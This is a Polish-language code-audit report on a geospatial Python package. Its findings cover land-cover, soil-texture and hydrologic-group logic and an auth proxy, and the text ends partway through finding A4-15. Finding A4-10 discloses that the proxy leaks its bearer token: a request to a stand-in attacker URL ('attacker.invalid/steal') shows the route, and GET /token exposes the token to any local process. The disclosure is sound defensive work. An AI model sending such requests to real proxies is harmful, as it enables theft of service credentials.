# A4 — Poprawnosc logiczna: pokrycie terenu, gleby, autoryzacja

Zakres: przeczytane w calosci `kartograf/providers/corine.py` (1208 l.),
`kartograf/providers/soilgrids.py` (695 l.), `kartograf/landcover/manager.py` (475 l.),
`kartograf/hydrology/hsg.py` (572 l.), `kartograf/auth/proxy.py` (339 l.),
`kartograf/auth/client.py` (299 l.). Pomocniczo (kontekst kontraktow, nie audytowane
jako obszar): `kartograf/providers/base.py`, `kartograf/sources/sidecar.py`,
`kartograf/cli/landcover_cmd.py`, `kartograf/cli/soilgrids_cmd.py`, `docs/CHANGELOG.md`
(Breaking Changes 0.7.0), `README.md` (sekcja CLMS), `tests/test_hsg.py`.

Metoda: czytanie pelnych plikow; grep po repo (`get_clms_credentials`, `CLMS_CREDENTIALS`,
`download_by_*`, `basicConfig`, `_storage`); uruchomione offline (bez sieci):
- `.venv/bin/python -m pytest tests/test_hsg.py tests/test_soilgrids.py tests/test_landcover.py tests/test_auth_client.py tests/test_auth_proxy.py -q -p no:cacheprovider` -> **212 passed, 3 warnings**
- 8 snippetow w `.venv/bin/python` (numpy/pyproj/rasterio/http.server) w scratchpadzie:
  porownanie skalar-vs-wektor na calym symplexie tekstur, porownanie z kanonicznym
  trojkatem USDA, symulacja nodata, statystyki na realnym rastrze EPSG:4326,
  `transform_bounds` vs transformacja narozy, uruchomienie realnego `auth.proxy`
  i realnego `AuthProxyClient.download_file` przeciw lokalnemu serwerowi zrywajacemu
  strumien, reprodukcja zakleszczenia na niedrenowanej rurze stderr.

Nie sprawdzono:
- Zgodnosci nazw osi WCS SoilGrids (`SUBSET=long(...)`/`SUBSET=lat(...)`) i UID-ow
  datasetow CLMS — wymaga sieci.
- Faktycznej wartosci `nodata` w plikach zwracanych przez WCS SoilGrids (brak sieci);
  ustalenie A4-5 jest sformulowane jako "kazde nodata != 0", co jest weryfikowalne
  offline i niezalezne od konkretnej wartosci.
- Przeplywu BDOT10k (`providers/pl/bdot10k.py`) — poza przydzielonym obszarem;
  dotknieta tylko wspolna warstwa `LandCoverProvider`.
- `--strict` mypy, stylu ruff, polskich znakow w docs (wylaczone regulaminem).

## Ustalenia

### A4-1 [Critical] `CLMS_CREDENTIALS` nigdy nie jest czytane — CORINE zawsze cicho spada na PNG
- Plik: `kartograf/providers/corine.py`:196-226 (definicja), `kartograf/auth/proxy.py`:52-56, `kartograf/cli/landcover_cmd.py`:86
- Twierdzenie: funkcja `get_clms_credentials()` (jedyne miejsce czytajace `CLMS_CREDENTIALS`) nie ma w repo ani jednego wywolania, a domyslna sciezka (`use_proxy=True`) czyta wylacznie macOS Keychain — wiec na Linux/Windows i na macOS bez Keychain `kartograf landcover download --source corine` **zawsze** oddaje podglad PNG zamiast GeoTIFF z kodami klas, mimo ze README i CLAUDE.md dokumentuja zmienna srodowiskowa jako sposob konfiguracji.
- Dowod:
  ```
  README.md:190: 3. Zapisz credentials w zmiennej srodowiskowej `CLMS_CREDENTIALS` (JSON string
  CLAUDE.md:26:  - `CLMS_CREDENTIALS` — credentials dla Copernicus CLMS API jako JSON string
  proxy.py:53-56:  def load_from_keychain(self) -> bool:
                       if platform.system() != "Darwin":
                           logger.error("Keychain only available on macOS")
                           return False
  landcover_cmd.py:86:  provider = CorineProvider()      # use_proxy=True, clms_credentials=None
  ```
- Weryfikacja: `grep -rn "get_clms_credentials" --include=*.py .` zwraca wylacznie linie definicji (196) i jej docstring — zero wywolan. Uruchomiony snippet: `CorineProvider().has_clms_token` -> `False` przy ustawionym `CLMS_CREDENTIALS`; podproces proxy wystartowal i zalogowal `[ERROR] Keychain only available on macOS`. Dodatkowo `logging.lastResort.level == WARNING`, a CLI nie wola `basicConfig` (`grep -rn "basicConfig" kartograf/` -> tylko `auth/proxy.py`), wiec komunikat `logger.info("Downloading CLC {year} preview via WMS (no CLMS token - styled image)")` (corine.py:559-561) **nie dociera do uzytkownika CLI** — jedynym sygnalem jest rozszerzenie `.png`.
- Proponowana naprawa: w `CorineProvider.__init__` przy `clms_credentials is None` wywolac `get_clms_credentials()` i, gdy zwroci dict, przejsc w tryb direct (`CLMSAuth`); alternatywnie nauczyc `CLMSCredentials.load_from_keychain` czytac najpierw `CLMS_CREDENTIALS` (wtedy sekret trafia do podprocesu przez srodowisko, a nie do procesu glownego — zgodnie z modelem proxy). Niezaleznie: podniesc komunikat o fallbacku do `logger.warning` albo wypisac go wprost w `cmd_landcover_download`.
- Pewnosc: wysoka

### A4-2 [Critical] `AuthProxyClient.download_file` zwraca `True` dla urwanego pobrania i zapisuje uszkodzony GeoTIFF
- Plik: `kartograf/auth/client.py`:283-288 oraz `kartograf/auth/proxy.py`:288-298
- Twierdzenie: gdy strumien z CLMS urwie sie w polowie, proxy — juz po `end_headers()` — dokleja do ciala odpowiedzi **druga pelna odpowiedz HTTP 502**, a klient (ktory sprawdza tylko `status_code == 200` i pisze bez pliku tymczasowego) zapisuje obciety raster z doklejonym tekstem HTTP i raportuje sukces.
- Dowod:
  ```
  proxy.py:288-298:  self.send_response(resp.status_code)
                     ... self.end_headers()
                     for chunk in resp.iter_content(chunk_size=8192): self.wfile.write(chunk)
                     except requests.RequestException as e:
                         self.send_json({"error": f"Download failed: {e}"}, 502)   # po end_headers!
  client.py:283-288: if resp.status_code == 200:
                         with open(output_path, "wb") as f: ...   # brak .tmp + rename
                     return True
  ```
  Wejscie: upstream oddaje `Transfer-Encoding: chunked`, jeden chunk 100 B (`II*\x00AAAA...`), potem zamyka polaczenie.
  Wyjscie (uruchomione):
  ```
  download_file zwrocil: True
  plik istnieje: True rozmiar: 309
  poczatek: b'II*\x00AAAAAAAAAAAA'
  koniec  : b'502 Bad Gateway\r\nServer: BaseHTTP/0.6 ...\r\n\r\n{"error": "Download failed: Response ended prematurely"}'
  ```
- Weryfikacja: skrypt scratchpad `download_chunked_check.py` — realny `ProxyHandler` (z podstawionym obiektem credentials), realny `AuthProxyClient.download_file`, lokalny upstream zrywajacy strumien. Wariant z `Content-Length` (`download_stream_check.py`) daje `return False`, ale **plik czesciowy zostaje na dysku** (brak `unlink`) — obie sciezki sa wadliwe. Nastepstwo: `CorineProvider._download_via_clms_proxy` (corine.py:676-678) zwraca sciezke jako sukces, a `LandCoverManager._write_sidecar` dopisuje do smiecia poprawny `<plik>.meta.json` z `horizontal_crs: EPSG:3035`.
- Proponowana naprawa: w `download_file` pisac do `output_path.with_suffix(suffix + ".<pid>_<tid>.tmp")` i `rename` dopiero po pelnym odczycie, a w `except` kasowac temp (wzorzec `_save_response` z corine.py:1107-1126); w `ProxyHandler` po `end_headers()` nie wolac `send_json` — zamiast tego zamknac polaczenie (`self.close_connection = True`) i zalogowac blad, ewentualnie buforowac odpowiedz przed wyslaniem naglowkow.
- Pewnosc: wysoka

### A4-3 [Critical] SoilGrids: `--teryt` pobiera dane dla srodka wojewodztwa, nie dla powiatu
- Plik: `kartograf/providers/soilgrids.py`:424-531 (`_get_bbox_for_teryt`), zwlaszcza 476, 504-519
- Twierdzenie: metoda wysyla zapytanie WMS GetFeatureInfo, **calkowicie ignoruje odpowiedz** i zwraca staly bbox 60x60 km wokol zahardkodowanego srodka wojewodztwa — wiec kazdy powiat w danym wojewodztwie dostaje identyczny, w wiekszosci przypadkow zupelnie inny obszar niz zadany.
- Dowod:
  ```
  soilgrids.py:505-519:
      response = session.get(url, timeout=timeout)
      response.raise_for_status()
      # For now, return approximate bbox based on wojewodztwo center
      # A more accurate implementation would parse WMS response
      powiat_size = 30000
      return BBox(min_x=center_x - powiat_size, ..., crs="EPSG:2180")
  ```
  Wejscia -> wyjscia (uruchomione):
  ```
  TERYT 1465 -> bbox (590000, 450000, 650000, 510000) | srodek 20.7554E 52.1730N
  TERYT 1401 -> bbox (590000, 450000, 650000, 510000) | srodek 20.7554E 52.1730N
  TERYT 1419 -> bbox (590000, 450000, 650000, 510000) | srodek 20.7554E 52.1730N
  identyczny bbox dla trzech roznych powiatow: True
  ```
  Powiat ostrolecki (1419) lezy ~100 km na polnoc od zwroconego srodka — w zamowionym prostokacie nie ma ani jednego jego piksela. Uzytkownik dostaje `logger.info(f"TERYT {teryt} bbox: {bbox}")` (linia 420) sugerujace, ze to bbox powiatu, przy czym na CLI ten komunikat i tak jest niewidoczny (patrz A4-1).
- Weryfikacja: snippet `teryt_check.py` z zamockowana `requests.Session` (offline), plus `pyproj` do przeliczenia srodka na WGS84.
- Proponowana naprawa: albo zaimplementowac realne wyznaczanie granic powiatu (parsowanie GetFeatureInfo / uzycie tego samego zrodla TERYT co `Bdot10kProvider`), albo — dopoki tego nie ma — usunac martwe zapytanie WMS i podniesc `NotImplementedError` z jasnym komunikatem ("SoilGrids nie obsluguje wyboru po TERYT, uzyj --bbox/--godlo"), tak jak robi to `CorineProvider.download_by_teryt`. Zwracanie prawdopodobnie blednych danych jako sukcesu jest gorsze niz brak funkcji.
- Pewnosc: wysoka

### A4-4 [Critical] Klasyfikacja USDA odbiega od trojkata teksturowego — 3,4% symplexu trafia do zlej grupy HSG
- Plik: `kartograf/hydrology/hsg.py`:116-169 (skalar) i 224-268 (wektor)
- Twierdzenie: progi sa uproszczone wzgledem kanonicznego trojkata USDA (brak warunkow `silt + 1.5*clay`, `silt + 2*clay`, `silt < 28`), przez co czesc gleb dostaje inna klase i inna grupe hydrologiczna — najwiekszy blad dotyczy gleb piaszczystych, dominujacych w Polsce.
- Dowod: porownanie z kanonicznym trojkatem (Soil Survey Manual / USDA Handbook 18) na siatce calkowitej co 1% (5151 punktow):
  ```
  rozne klasy tekstur : 378 (7.3%)
  rozne grupy HSG     : 176 (3.4%)

    USDA=sandy_loam  kod=loamy_sand      HSG B->A  n=136  przyklad (clay,sand,silt)=(0, 70, 30)
    USDA=loam        kod=sandy_clay_loam HSG B->C  n=35   przyklad (clay,sand,silt)=(20, 45, 35)
    USDA=clay_loam   kod=sandy_clay      HSG C->D  n=5    przyklad (clay,sand,silt)=(35, 45, 20)
  ```
  Zrodlo bledow w kodzie:
  ```
  hsg.py:120:  if clay <= 15 and sand >= 70:  return "loamy_sand"   # USDA wymaga silt+2*clay < 30
  hsg.py:145:  if clay >= 20 and clay < 35 and sand >= 45: return "sandy_clay_loam"  # USDA wymaga silt < 28
  hsg.py:137:  if clay >= 35 and sand >= 45: return "sandy_clay"    # USDA wymaga sand > 45 (ostro)
  ```
- Weryfikacja: snippet `usda_ref.py` — referencyjna implementacja trojkata USDA vs `classify_usda_texture` na calym symplexie; wyniki powyzej. Skutek jest bezposrednio uzytkowy: HSG jest deklarowanym wejsciem metody SCS-CN (Hydrolog), a A vs B to inny Curve Number.
- Proponowana naprawa: zastapic uproszczone progi kanonicznymi regulami trojkata USDA (12 warunkow z `silt + 1.5*clay` / `silt + 2*clay` / `silt < 28`) w `classify_usda_texture` i odzwierciedlic je 1:1 w wersji wektorowej; testy w `tests/test_hsg.py` (linie 36-69) pinuja obecne zachowanie i wymagaja aktualizacji razem z kodem.
- Pewnosc: wysoka

### A4-5 [Critical] Piksele nodata inne niz 0 dostaja grupe HSG "B" zamiast nodata
- Plik: `kartograf/hydrology/hsg.py`:499-500 (oraz 475-483 — `src.nodata` nie jest odczytywane)
- Twierdzenie: maska nodata jest zahardkodowana jako `clay == 0 and sand == 0 and silt == 0`; dla dowolnej innej wartosci nodata (SoilGrids to raster Int16, standardowa wartosc `-32768`) suma `clay+sand+silt` jest ujemna, `valid = total > 0` jest `False`, znormalizowane udzialy wychodza 0/0/0, klasyfikator zwraca domyslny `loam`, a wynikowy piksel dostaje HSG **2 = B** zamiast 0 = nodata.
- Dowod: wejscie `[prawidlowy, -32768, 0]` -> wyjscie (uruchomione):
  ```
  tekstura: ['clay_loam', 'loam', 'loam']
  HSG po maskowaniu (0=nodata,1=A,2=B,3=C,4=D): [3, 2, 0]
                                                    ^ nodata=-32768 zaraportowane jako grupa B
  ```
  Kod:
  ```
  hsg.py:475-477:  with rasterio.open(clay_path) as clay_src:
                       clay = clay_src.read(1).astype(np.float32)   # clay_src.nodata pominiete
  hsg.py:499-500:  nodata_mask = (clay == 0) & (sand == 0) & (silt == 0)
                   hsg[nodata_mask] = 0
  ```
- Weryfikacja: snippet `nodata_check.py` odtwarzajacy dokladnie potok z `calculate_hsg_by_bbox` (g/kg -> `/CONVERSION_FACTOR` -> `classify_usda_texture_array` -> `texture_to_hsg_array` -> maska). Istniejacy test `test_calculate_hsg_nodata_handling` (tests/test_hsg.py:416) sprawdza wylacznie przypadek all-zero, wiec nie wykrywa tej luki. Skutek: obszary bez danych (m.in. wody, tereny poza pokryciem) trafiaja do statystyk i do rastra jako realna gleba grupy B.
- Proponowana naprawa: odczytac `clay_src.nodata` / `sand_src.nodata` / `silt_src.nodata` i zbudowac maske jako `(clay == nd) | (sand == nd) | (silt == nd)` (z fallbackiem na `~np.isfinite`), zamiast porownania z 0; maske stosowac przed klasyfikacja, a nie po niej.
- Pewnosc: wysoka (mechanizm potwierdzony offline; konkretna wartosc nodata SoilGrids nie byla weryfikowana przez siec, ale ustalenie obowiazuje dla kazdej wartosci != 0)

### A4-6 [Critical] `get_hsg_statistics` liczy powierzchnie w stopniach kwadratowych — CLI drukuje "0.00 ha"
- Plik: `kartograf/hydrology/hsg.py`:551-567; konsument: `kartograf/cli/soilgrids_cmd.py`:149-153
- Twierdzenie: raster HSG dziedziczy profil z rastra SoilGrids, ktory jest w EPSG:4326 (`OUTPUTCRS=.../EPSG/0/4326`, soilgrids.py:363; deskryptor `global.isric.soilgrids` deklaruje `horizontal_crs='EPSG:4326'`), wiec `src.transform[0]` i `[4]` sa w **stopniach** — `pixel_area` opisane w kodzie jako "m²" jest w stopniach kwadratowych, a `area_ha` wychodzi ~10 rzedow wielkosci za male.
- Dowod:
  ```
  hsg.py:553:  pixel_area = abs(src.transform[0] * src.transform[4])  # m^2
  soilgrids_cmd.py:153:  print(f"  Group {group}: {pct:.1f}% ({area:.2f} ha)")
  ```
  Wejscie: raster 100x100 px, EPSG:4326, rozdzielczosc 0.0022457 st. (~250 m, jak SoilGrids), wszystkie piksele = 2 (grupa B). Wyjscie (uruchomione):
  ```
  liczba pikseli B: 10000
  area_ha (kod)   : 5.043168490000001e-06
  area_m2 (kod)   : 0.05043168490000001
  prawidlowo (~250m px, 10000 px): 62500.0 ha
  ```
  CLI wypisze `Group B: 100.0% (0.00 ha)` zamiast `62500.00 ha`.
- Weryfikacja: snippet `area_check.py` — realny GeoTIFF zbudowany przez `rasterio`, realne wywolanie `HSGCalculator.get_hsg_statistics`. Pole `percent` pozostaje poprawne (liczy piksele), bledne sa wylacznie `area_m2` i `area_ha`.
- Proponowana naprawa: liczyc pole z uwzglednieniem CRS — dla rastra geograficznego uzyc `pyproj.Geod.geometry_area_perimeter` na komorce lub przeliczyc lokalny wspolczynnik (`m_lon = 111320*cos(lat)`), albo (prosciej i spojnie z reszta projektu) reprojektowac raster HSG do CRS metrycznego przed zapisem. Do czasu naprawy nie drukowac pola powierzchni.
- Pewnosc: wysoka

### A4-7 [Critical] Transformacja bbox po dwoch narozach zawezia zamawiany obszar (SoilGrids i CORINE)
- Plik: `kartograf/providers/soilgrids.py`:251-272; `kartograf/providers/corine.py`:994-1012 i 1014-1030
- Twierdzenie: obie klasy przeliczaja tylko naroza SW i NE, co dla prostokata w EPSG:2180 (siatka obrocona wzgledem poludnikow poza poludnikiem srodkowym 19°E) daje prostokat **mniejszy** niz rzeczywista obwiednia — zamawiany obszar jest systematycznie za waski, a dla CORINE dodatkowo rozjezdzaja sie proporcje obrazu wzgledem `WIDTH`/`HEIGHT`.
- Dowod: arkusz `N-34-130-D` (uzywany w przykladach README/CLAUDE.md), uruchomione:
  ```
  kod (2 naroza) 4326 : (22.735906, 52.333780, 23.015087, 52.499488)
  transform_bounds    : (22.735906, 52.325146, 23.015087, 52.508176)
  utracone stopnie lat: -0.008634 (-961 m) na poludniu, -0.008688 (-967 m) na polnocy
  ```
  Przy wysokosci arkusza 19,4 km oznacza to brak ~10% zamowionej powierzchni (dwa pasy po ~960 m). Dla CORINE WMS:
  ```
  3857 kod: (2530949.5, 6860703.7, 2562027.8, 6890948.1)
  3857 obw: (2530949.5, 6859131.0, 2562027.8, 6892537.0)
  WIDTH/HEIGHT = 179 194 | aspect px = 0.92268 | aspect bbox3857 = 1.02757 -> znieksztalcenie 11.37%
  ```
  czyli podglad PNG jest dodatkowo rozciagniety o ~11%, bo `width_px`/`height_px` licza sie z metrow EPSG:2180 (corine.py:545-548), a `BBOX` idzie z narozy w EPSG:3857.
- Weryfikacja: snippet `bbox_check.py` — `SheetParser("N-34-130-D").get_bbox(crs="EPSG:2180")` + `pyproj.Transformer.transform` (metoda z kodu) vs `Transformer.transform_bounds` (poprawna obwiednia).
- Proponowana naprawa: zastapic obie metody wywolaniem `transformer.transform_bounds(min_x, min_y, max_x, max_y, densify_pts=21)` (pyproj >= 3.1, juz wymagany) — jedna zmiana naprawia i SoilGrids/WCS, i CLMS `BoundingBox`, i oba `_construct_*_wms_url`; dodatkowo liczyc `WIDTH`/`HEIGHT` z bboxa docelowego, a nie z metrow EPSG:2180.
- Pewnosc: wysoka

### A4-8 [Important] float32: wersja wektorowa i skalarna rozjezdzaja sie na granicy clay = 15%
- Plik: `kartograf/hydrology/hsg.py`:215-217 (normalizacja) i 263 (prog `loamy_sand`)
- Twierdzenie: normalizacja `clay / total * 100` w float32 daje dla dokladnie 15% wartosc `15.000001`, przez co warunek `clay_n <= 15` nie lapie granicy — dla identycznego wejscia `classify_usda_texture` zwraca `loamy_sand` (HSG A), a `classify_usda_texture_array` `sandy_loam` (HSG B).
- Dowod: uruchomione, wejscie z realnego potoku (SoilGrids g/kg -> `/10`):
  ```
  float32 clay_n = np.float32(15.000001)  <=15 ? False
  float64 clay_n = 15.0                   <=15 ? True
  pipeline array  -> sandy_loam   (HSG B)
  pipeline scalar -> loamy_sand   (HSG A)
  ```
  Porownanie obu funkcji na calym symplexie (siatka co 1%): **16 rozbieznosci**, wszystkie na `clay = 15` przy `sand` 70-85, wszystkie zmieniajace grupe HSG z A na B.
- Weryfikacja: snippety `hsg_check.py` (pelne porownanie skalar-vs-wektor) i `hsg_fp.py` (izolacja przyczyny w float32).
- Proponowana naprawa: normalizowac w float64 (`clay.astype(np.float64)` albo `total = (clay + sand + silt).astype(np.float64)`) lub porownywac z tolerancja (`clay_n <= 15 + 1e-4`). Docelowo — po naprawie A4-4 — wygenerowac wersje wektorowa z tych samych progow co skalarna, zeby rozjazd nie mogl wrocic.
- Pewnosc: wysoka

### A4-9 [Important] `TEXTURE_TO_HSG` przeczy docstringowi wlasnego modulu i cytowanej normie USDA-NRCS
- Plik: `kartograf/hydrology/hsg.py`:66-79 vs `kartograf/hydrology/hsg.py`:9-16
- Twierdzenie: tabela mapowania przypisuje trzy klasy inaczej niz sekcja "HSG Classification (USDA-NRCS)" na poczatku tego samego pliku i inaczej niz cytowany NEH-630 rozdz. 7.
- Dowod:
  ```
  hsg.py:10-13 (docstring):  Group A: sand, loamy sand, sandy loam
                             Group D: clay loam, silty clay, clay
  hsg.py:69:  "sandy_loam": "B",         # docstring i NRCS: A
  hsg.py:74:  "clay_loam": "C",          # docstring i NRCS: D
  hsg.py:75:  "silty_clay_loam": "C",    # NRCS: D
  ```
- Weryfikacja: `grep -n "clay_loam\|sandy_loam" tests/test_hsg.py` — testy (linie 104, 112, 113) pinuja obecne, odbiegajace wartosci, wiec rozjazd jest trwaly i nie zostanie wychwycony. Zestawione z A4-4: nawet po naprawie progow tekstur wynikowe HSG nadal bedzie odbiegac od normy, do ktorej modul sie odwoluje.
- Proponowana naprawa: rozstrzygnac, ktore mapowanie jest zamierzone. Jesli norma — poprawic tabele (`sandy_loam`->A, `clay_loam`->D, `silty_clay_loam`->D) i testy. Jesli swiadome zlagodzenie — usunac sprzeczna liste z docstringu modulu, opisac odstepstwo i uzasadnienie w `docs/DECISIONS.md` (nowe ADR) oraz w README, zeby Hydrolog wiedzial, jakie CN dostaje.
- Pewnosc: wysoka

### A4-10 [Important] Auth proxy nie uwierzytelnia klienta i przekazuje token na dowolny URL
- Plik: `kartograf/auth/proxy.py`:173-254 (brak jakiejkolwiek kontroli dostepu), 211-226 (brak allowlisty URL)
- Twierdzenie: serwer proxy przyjmuje `/health`, `/token`, `/proxy` i `/download` od **kazdego** procesu na maszynie — nie ma zadnego sekretu wspoldzielonego z rodzicem — a `/proxy` dokleja `Authorization: Bearer <token CLMS>` do adresu podanego w ciele zadania, bez ograniczenia do domeny `land.copernicus.eu`. Dowolny lokalny proces moze zatem wyciagnac token (`GET /token`) albo wystawic go na kontrolowany przez siebie host (`POST /proxy` z `url` atakujacego).
- Dowod:
  ```
  proxy.py:211:  target_url = request_data.get("url")     # brak walidacji hosta
  proxy.py:221-226:  token = self.credentials.get_access_token()
                     headers["Authorization"] = f"Bearer {token}"
  proxy.py:184-189:  elif parsed.path == "/token":  token = ...; self.send_json({"access_token": token})
  ```
  Uruchomione (realny `python -m kartograf.auth.proxy`, klient to niezalezny proces `urllib`):
  ```
  proxy nasluchuje na porcie 45023
  GET /health bez uwierzytelnienia klienta -> 200 {"status": "ok", "credentials_available": false}
  POST /proxy {"url":"http://attacker.invalid/steal"} -> 500 {"error": "Failed to get access token"}
  ```
  Odpowiedz 500 (a nie 401/403) potwierdza, ze zadanie do obcego hosta zostalo **przyjete i przetworzone** az do etapu pobrania tokena — na macOS z wypelnionym Keychainem doszloby do wyslania naglowka z tokenem.
- Weryfikacja: snippet `proxy_check.py` (offline, `attacker.invalid` jest adresem nierozwiazywalnym). Osobno: `_cleanup` jest zarejestrowany tylko przez `atexit` (client.py:63), wiec po `SIGKILL` rodzica proxy zostaje jako osierocony serwer nasluchujacy dalej.
- Proponowana naprawa: (1) wygenerowac w rodzicu losowy sekret, przekazac go dziecku przez stdin/env i wymagac w naglowku `X-Proxy-Auth` na kazdym endpoincie; (2) w `/proxy` i `/download` odrzucac URL-e spoza allowlisty hostow (`land.copernicus.eu` + host z `DownloadURL`); (3) rozwazyc usuniecie `/token` — CorineProvider z niego nie korzysta, a to jedyny endpoint oddajacy token wprost.
- Pewnosc: wysoka

### A4-11 [Important] `stderr` podprocesu proxy jest rura, ktorej nikt nie czyta — proxy zakleszcza sie po ~500-1000 zadaniach
- Plik: `kartograf/auth/client.py`:94-97 (`stderr=subprocess.PIPE`) vs `kartograf/auth/proxy.py`:33-37 i 160-162
- Twierdzenie: proxy loguje na stderr przy kazdym zadaniu (`log_message` + ewentualny `[ERROR] Keychain...`), a rodzic czyta z podprocesu wylacznie jedna linie ze **stdout** i nigdy nie drenuje stderr; po zapelnieniu bufora rury (64 KB na Linuxie) podproces blokuje sie na `write()` i przestaje obslugiwac zadania — petla `_poll_clms_task_proxy` wisi wtedy do `CLMS_MAX_WAIT` (600 s), po czym zglasza timeout.
- Dowod:
  ```
  client.py:94-97:  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
  client.py:100:    port_line = self._proxy_process.stdout.readline().strip()   # jedyny odczyt
  proxy.py:160-162: def log_message(self, format, *args): logger.info(...)      # 1-2 linie/zadanie
  ```
  Reprodukcja (uruchomione, dziecko pisze ~4000 linii logu o dlugosci realnych wpisow proxy):
  ```
  port: PORT-OK
  po 5 s: proces zakonczony? False (rc=None)
  -> PODPROCES ZABLOKOWANY na write() do niedrenowanej rury stderr
  ```
  Arytmetyka: ~120 B na para linii, 65536/120 ~ 546 zadan; jedno pobranie CORINE to do 60 odpytan statusu (`CLMS_MAX_WAIT`/`CLMS_POLL_INTERVAL` = 600/10) plus zadanie i pobranie — czyli granica jest w zasiegu jednej dluzszej sesji wsadowej.
- Weryfikacja: snippet `pipe_fill.py`; dodatkowo `corine_side_effect.py` potwierdza na zywym obiekcie, ze `cli._proxy_process.stderr is not None`.
- Proponowana naprawa: `stderr=subprocess.DEVNULL` (albo przekierowanie do pliku logu), ewentualnie watek-drenaz przepisujacy stderr dziecka do `logger`. Przy okazji obnizyc gadatliwosc proxy (`log_message` -> `logger.debug`).
- Pewnosc: wysoka

### A4-12 [Important] `SoilGridsProvider.download_by_admin_unit` rzuca `NotImplementedError` mimo dzialajacej obslugi TERYT
- Plik: `kartograf/providers/soilgrids.py`:378 vs `kartograf/providers/base.py`:278-303
- Twierdzenie: po zmianie z 0.7.0 kanoniczna nazwa to `download_by_admin_unit`, a `download_by_teryt` jest jej aliasem — ale SoilGrids nadpisal wylacznie **przestarzaly alias**, wiec wywolanie kanonicznej nazwy trafia w bazowa implementacje i konczy sie wyjatkiem, mimo ze provider TERYT obsluguje.
- Dowod: uruchomione:
  ```
  SoilGridsProvider
     download_by_admin_unit   zdefiniowane w: LandCoverProvider
     download_by_teryt        zdefiniowane w: SoilGridsProvider
  Bdot10kProvider
     download_by_admin_unit   zdefiniowane w: Bdot10kProvider
     download_by_teryt        zdefiniowane w: LandCoverProvider

  SoilGridsProvider().download_by_admin_unit("1465", Path(...)) -> NotImplementedError:
      SoilGridsProvider does not support TERYT downloads
  ```
  `docs/CHANGELOG.md` (Breaking Changes 0.7.0) opisuje `download_by_teryt` jako "wrapper zgodnosciowy" — konsument, ktory zastosuje sie do migracji i przejdzie na kanoniczna nazwe, straci obsluge TERYT dla SoilGrids. `LandCoverManager` (manager.py:198, 242) sam nadal wola alias, wiec CLI tego nie ujawnia.
- Weryfikacja: snippet `api_check.py` (`inspect.signature` + rozwiazywanie MRO + realne wywolanie). Testy `tests/test_landcover.py` i `tests/test_soilgrids.py` przechodza (212 passed) — luka nie jest pokryta.
- Proponowana naprawa: przemianowac `SoilGridsProvider.download_by_teryt` na `download_by_admin_unit(self, code, output_path, timeout=..., **kwargs)` (alias z bazy zapewni zgodnosc wstecz), a `LandCoverManager` przestawic na kanoniczna nazwe — inaczej alias przestanie byc "przestarzaly" i stanie sie jedyna dzialajaca sciezka. Uwaga: naprawa A4-3 moze te metode w ogole usunac.
- Pewnosc: wysoka

### A4-13 [Important] `CorineProvider()` uruchamia podproces auth proxy takze tam, gdzie nie moze on miec credentials
- Plik: `kartograf/providers/corine.py`:449-460 (`has_clms_token`) -> `kartograf/auth/client.py`:151-160 (`is_available` -> `_ensure_proxy`)
- Twierdzenie: sprawdzenie "czy mam token" ma efekt uboczny w postaci wystartowania podprocesu Pythona, ktory zyje do konca interpretera — nawet na systemie bez macOS Keychain, gdzie `CLMSCredentials.load_from_keychain` z definicji zwraca `False`.
- Dowod: uruchomione (`subprocess.Popen` opakowany szpiegiem):
  ```
  has_clms_token: False
  podprocesy uruchomione: [['.../python', '-m', 'kartograf.auth.proxy', '--port', '0']]
  podproces zyje po sprawdzeniu: True
  ```
  W logu proxy: `[ERROR] Keychain only available on macOS` — czyli koszt jest ponoszony wylacznie po to, by dowiedziec sie tego, co `platform.system() != "Darwin"` mowi od razu.
- Weryfikacja: snippet `corine_side_effect.py`. Skutki: zbedny proces i otwarty port (patrz A4-10) na kazdej sesji `landcover download --source corine`, oraz opoznienie startu; laczy sie z A4-11 (ten sam proces trzyma niedrenowana rure).
- Proponowana naprawa: w `AuthProxyClient.is_available()` (albo w `has_clms_token`) zwracac `False` bez startowania podprocesu, gdy zrodlo credentials jest niedostepne — np. `platform.system() != "Darwin" and not os.environ.get("CLMS_CREDENTIALS")`. Naturalnie laczy sie z naprawa A4-1.
- Pewnosc: wysoka

### A4-14 [Important] `_start_proxy`: blokujacy `readline()` bez limitu czasu, nieudany podproces nie jest sprzatany
- Plik: `kartograf/auth/client.py`:99-113
- Twierdzenie: `PROXY_STARTUP_TIMEOUT` chroni dopiero faze health-check (`_wait_for_proxy`), natomiast odczyt numeru portu to nieograniczony czasowo `readline()` na stdout dziecka — jesli podproces wystartuje, ale nie dojdzie do `print(actual_port)` (np. zablokuje sie na `HTTPServer(...)` albo na imporcie), caly CLI wisi bez limitu. Dodatkowo, gdy `readline()` zwroci pusty string, metoda zwraca `False`, nie wywolujac `terminate()`/`wait()` — `self._proxy_process` zostaje ustawiony na martwy proces.
- Dowod:
  ```
  client.py:100-104:  port_line = self._proxy_process.stdout.readline().strip()
                      if not port_line:
                          logger.error("Proxy did not output port number")
                          return False          # brak terminate() / wait() / reset _proxy_process
  client.py:21:       PROXY_STARTUP_TIMEOUT = 10  # uzywane dopiero w _wait_for_proxy (linia 118)
  ```
- Weryfikacja: czytanie kodu + potwierdzone eksperymentalnie zachowanie rury z A4-11 (ten sam mechanizm blokowania na I/O podprocesu); nie odtwarzano zawieszenia startu.
- Proponowana naprawa: czytac port w watku z `Thread`+`join(PROXY_STARTUP_TIMEOUT)` albo uzyc `selectors`/`communicate(timeout=...)`; w kazdej sciezce bledu wolac `terminate()` + `wait(timeout=5)` i ustawiac `self._proxy_process = None`, zeby `_ensure_proxy` mogl czysto sprobowac ponownie.
- Pewnosc: srednia (mechanizm pewny, prawdopodobienstwo wystapienia niskie)

### A4-15 [Minor] Eager dzielenie w wersji wektorowej generuje RuntimeWarning przy nodata
- Plik: `kartograf/hydrology/hsg.py`:215-217
- Twierdzenie: `np.where(valid, clay / total * 100, 0)` liczy dzielenie dla **wszystkich** pikseli, takze tych z `total == 0`, co daje `0/0 = nan` i ostrzezenie; sam wynik jest poprawny (gałąź `0` jest wybierana), ale przy `np.seterr(all="raise")` u konsumenta (Hydrolog/Hydrograf) potok wywali sie `FloatingPointError`.
- Dowod: `pytest tests/test_hsg.py ... -q` konczy sie `212 passed, 3 warnings`:
  ```
  hsg.py:215: RuntimeWarning: invalid value encountered in divide
      clay_n = np.where(valid, clay / total * 100, 0)
  hsg.py:216 / hsg.py:217 — analogicznie dla sand_n i silt_n
  ```
